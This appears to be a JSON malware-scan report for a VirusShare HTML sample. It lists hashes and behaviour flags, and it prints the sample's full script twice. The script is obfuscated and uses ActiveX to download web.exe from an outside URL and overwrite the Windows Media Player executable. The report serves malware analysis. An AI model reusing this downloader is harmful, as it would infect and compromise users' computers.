@@ -1,0 +1,86 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "ADODB.Stream": "May create a text file",
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Microsoft.XMLHTTP": "May download files from the Internet",
+            "Open": "May open a file",
+            "Write": "May write to a file"
+        },
+        "macro": "<html>\n<textarea id=\"code\" style=\"display:none;\">\nvar x = new ActiveXObject(\"Microsoft.XMLHTTP\");\nx.Open(\"GET\", \"http://www.all-find.org/mih2/web.exe\", 0);\nvar s = new ActiveXObject(\"ADODB.Stream\");\ns.Mode = 3;\ns.Type = 1;\ns.Open();\ns.Write(x.responseBody);\nlocation.href=\"mms://\";\n</textarea>\n<script language=\"javascript\">\nfunction preparecode(code) \n{\n  result = '';\n  code=code+\"s.Sav\";\n  code=code+\"eToF\";\n  code=code+'ile(\"c:\\\\\\\\program';\n  code=code+' files\\\\\\\\wind';\n  code=code+'ows media player\\\\\\\\wmp';\n  code=code+'layer.exe\", 2);';\n  lines = code.split(/\\r\\n/);\n  for (i=0; i<lines.length; i++) \n  {\n    line = lines[i];\n    line = line.replace(/^\\s+/,\"\");\n    line = line.replace(/\\s+$/,\"\");\n    line = line.replace(/'/g,\"\\\\'\");\n    line = line.replace(/[\\\\]/g,\"\\\\\\\\\");\n    line = line.replace(/[/]/g,\"%2f\");\n    if (line != '') \n    {\n      result += line +'\\\\r\\\\n';\n    }\n  }\n  return result;\n}\nfunction doit() \n{\n  mycode = preparecode(document.all.code.value);\n  her = mycode.split(/s.Mode = 3;/);\n  avp=\"x.S\";\n  avp=avp+\"end();\\r\\n\";\n  avp=avp+\"s.Mode=3;\\r\\n;\";\n  mycode=her[0];\n  mycode=mycode+avp;\n  mycode=mycode+her[1];\n  myURL = \"file:javascript:eval('\" + mycode + \"')\";\n  window.open(myURL, \"_media\")\n}\nsetTimeout(\"doit()\", 5000);\n</script>\n</html>"
+    },
+    "filename": "VirusShare_179a41902e19a6bc03d4821c3a26cdce",
+    "filesize": 1273,
+    "filetype": "HTML document, ASCII text",
+    "hashes": {
+        "md5": "179a41902e19a6bc03d4821c3a26cdce",
+        "sha1": "3f8c4f93ff523c658cdcdd49d076f81bcd26439d",
+        "sha256": "74bc25361c693c6653a996b45f3cd5820c49c3cefeb3bd755cb45920f2b9d0cc"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html>",
+            "<textarea id=\"code\" style=\"display:none;\">",
+            "var x = new ActiveXObject(\"Microsoft.XMLHTTP\");",
+            "x.Open(\"GET\", \"http://www.all-find.org/mih2/web.exe\", 0);",
+            "var s = new ActiveXObject(\"ADODB.Stream\");",
+            "s.Mode = 3;",
+            "s.Type = 1;",
+            "s.Open();",
+            "s.Write(x.responseBody);",
+            "location.href=\"mms://\";",
+            "</textarea>",
+            "<script language=\"javascript\">",
+            "function preparecode(code) ",
+            "  result = '';",
+            "  code=code+\"s.Sav\";",
+            "  code=code+\"eToF\";",
+            "  code=code+'ile(\"c:\\\\\\\\program';",
+            "  code=code+' files\\\\\\\\wind';",
+            "  code=code+'ows media player\\\\\\\\wmp';",
+            "  code=code+'layer.exe\", 2);';",
+            "  lines = code.split(/\\r\\n/);",
+            "  for (i=0; i<lines.length; i++) ",
+            "    line = lines[i];",
+            "    line = line.replace(/^\\s+/,\"\");",
+            "    line = line.replace(/\\s+$/,\"\");",
+            "    line = line.replace(/'/g,\"\\\\'\");",
+            "    line = line.replace(/[\\\\]/g,\"\\\\\\\\\");",
+            "    line = line.replace(/[/]/g,\"%2f\");",
+            "    if (line != '') ",
+            "    {",
+            "      result += line +'\\\\r\\\\n';",
+            "    }",
+            "  return result;",
+            "function doit() ",
+            "  mycode = preparecode(document.all.code.value);",
+            "  her = mycode.split(/s.Mode = 3;/);",
+            "  avp=\"x.S\";",
+            "  avp=avp+\"end();\\r\\n\";",
+            "  avp=avp+\"s.Mode=3;\\r\\n;\";",
+            "  mycode=her[0];",
+            "  mycode=mycode+avp;",
+            "  mycode=mycode+her[1];",
+            "  myURL = \"file:javascript:eval('\" + mycode + \"')\";",
+            "  window.open(myURL, \"_media\")",
+            "setTimeout(\"doit()\", 5000);",
+            "</script>",
+            "</html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.all-find.org/mih2/web.exe"
+        ]
+    },
+    "time": "0:00:00.266053",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
